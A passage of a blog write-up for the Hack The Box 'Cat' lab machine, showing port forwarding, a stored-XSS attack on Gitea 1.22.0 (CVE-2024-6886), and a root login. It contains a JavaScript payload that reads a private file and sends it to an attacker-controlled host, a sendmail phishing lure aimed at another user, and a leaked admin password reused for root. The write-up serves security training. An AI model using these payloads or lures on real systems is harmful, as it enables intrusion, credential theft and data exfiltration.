class="built_in">id</span> 48S55Sm0002267</span><br><span class="line">        <span class="keyword">for</span> axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT</span><br><span class="line">Date: Sat, 28 Sep 2024 05:05:28 GMT</span><br><span class="line">From: rosa@cat.htb</span><br><span class="line">Message-Id: &lt;202409280505.48S55Sm0002267@cat.htb&gt;</span><br><span class="line">Subject: Employee management</span><br><span class="line"></span><br><span class="line">We are currently developing an employee management system. Each sector administrator will be assigned a specific role, <span class="keyword">while</span> each employee will be able to consult their assigned tasks. The project is still under development and is hosted <span class="keyword">in</span> our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.</span><br></pre></td></tr></table></figure></div>
+<p>only axel is readable, jobert and root was denied for access</p>
+<p>From the email, notice that a Gitea which normally runs on port 3000 is currently running at localhost:3000.<br>Check for other running services</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">axel@<span class="built_in">cat</span>:~$ netstat -tuln</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State</span><br><span class="line">tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 127.0.0.1:41839         0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 127.0.0.1:44787         0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN</span><br><span class="line">tcp        0      0 127.0.0.1:40507         0.0.0.0:*               LISTEN</span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN</span><br><span class="line">udp        0      0 127.0.0.53:53           0.0.0.0:*</span><br></pre></td></tr></table></figure></div>
+
+<p>With port forwarding for port 587, 3000 and 25. Access the website on port 3000 which is Gitea.<br>Port 25 &amp; 587 are open for SMTP Mail Services.</p>
+<ol>
+<li>587 for mail submission (SMTP with authentication)</li>
+<li>25 for mail relay (server-to-server communication)</li>
+</ol>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/htb/machines/cat~10.10.11.53$ <span class="built_in">sudo</span> ssh -L 3000:localhost:3000 -L 25:localhost:25 -L 587:localhost:587 axel@<span class="variable">$ip</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Port 3000 is running Gitea v1.22.0 which is vulnerable to CVE-2024-6886 (Stored XSS vulnerability)<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cat/Pasted image 20250206011419.png"
+                      width="250"
+                ></p>
+<p>Steps of exploitation:</p>
+<ol>
+<li>setup http listener</li>
+<li>create new repo on Gitea</li>
+<li>add a file</li>
+<li>inject javascript payload in description</li>
+<li>trick Jobert into clicking the link</li>
+<li>trigger cve</li>
+</ol>
+<p>Using password of <code>axel</code>, log in into Gitea<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cat/Pasted image 20250206011632.png"
+                      width="100"
+                ></p>
+<p>Create a repo to contain the malicious payload<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cat/Pasted image 20250206011728.png"
+                      width="500"
+                ></p>
+<p>Add a dummy file into the repo and inject JavaScript payload in the Description<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cat/Pasted image 20250206011815.png"
+                      width="300"
+                ></p>
+<p>In the description, inject the JavaScript payload</p>
+<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:fetch(&#x27;http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php&#x27;)</span></span><br><span class="line"><span class="string">.then(response =&gt; response.text())</span></span><br><span class="line"><span class="string">.then(data =&gt; fetch(&#x27;http://10.10.14.119:8000/?a=&#x27; + encodeURIComponent(data)))</span></span><br><span class="line"><span class="string">.catch(error =&gt; console.error(&#x27;Error:&#x27;, error));&quot;</span>&gt;<span class="variable constant_">EXPLOIT</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure></div>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cat/Pasted image 20250206012032.png"
+                      width="500"
+                >
+
+
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">axel@<span class="built_in">cat</span>:~$ <span class="built_in">echo</span> -e <span class="string">&quot;Subject: test \n\nRead this http://localhost:3000/axel/new-repo-my&quot;</span> | sendmail jobert@localhost</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/cat~10.10.11.53$ python3 -m http.server 8080</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...</span><br><span class="line">10.10.11.53 - - [06/Feb/2025 01:53:34] <span class="string">&quot;GET /?a=%3C%3Fphp%0A%24valid_username%20%3D%20%27admin%27%3B%0A%24valid_password%20%3D%20%27IKw75eR0MR7CMIxhH0%27%3B%0A%0Aif%20(!isset(%24_SERVER%5B%27PHP_AUTH_USER%27%5D)%20%7C%7C%20!isset(%24_SERVER%5B%27PHP_AUTH_PW%27%5D)%20%7C%7C%20%0A%20%20%20%20%24_SERVER%5B%27PHP_AUTH_USER%27%5D%20!%3D%20%24valid_username%20%7C%7C%20%24_SERVER%5B%27PHP_AUTH_PW%27%5D%20!%3D%20%24valid_password)%20%7B%0A%20%20%20%20%0A%20%20%20%20header(%27WWW-Authenticate%3A%20Basic%20realm%3D%22Employee%20Management%22%27)%3B%0A%20%20%20%20header(%27HTTP%2F1.0%20401%20Unauthorized%27)%3B%0A%20%20%20%20exit%3B%0A%7D%0A%0Aheader(%27Location%3A%20dashboard.php%27)%3B%0Aexit%3B%0A%3F%3E%0A%0A HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure></div>
+
+<p>Decoding it returns</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$valid_username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$valid_password</span> = <span class="string">&#x27;IKw75eR0MR7CMIxhH0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>]) || </span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>] != <span class="variable">$valid_username</span> || <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>] != <span class="variable">$valid_password</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;WWW-Authenticate: Basic realm=&quot;Employee Management&quot;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: dashboard.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Using the admin password, we can escalate to root via <code>axel</code>‘s shell</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">axel@<span class="built_in">cat</span>:~$ su root</span><br><span class="line">Password:</span><br><span class="line">root@<span class="built_in">cat</span>:~# <span class="built_in">cd</span></span><br><span class="line">root@<span class="built_in">cat</span>:~# <span class="built_in">ls</span></span><br><span class="line">root.txt  scripts</span><br><span class="line">root@<span class="built_in">cat</span>:~# <span class="built_in">cat</span> root.txt</span><br><span class="line">355c2e540604b8f5d8833ede983325d5</span><br></pre></td></tr></table></figure></div>
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/HTB/">#HTB</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Linux/">#Linux</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/02/16/Hackthebox/htb-titanic/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-Titanic</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/01/29/Hackthebox/HTB-Certified/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-Certified</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">HTB-Cat</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Reflective-XSS"><span class="nav-text">Reflective XSS</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Muyi</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        37 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog "></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
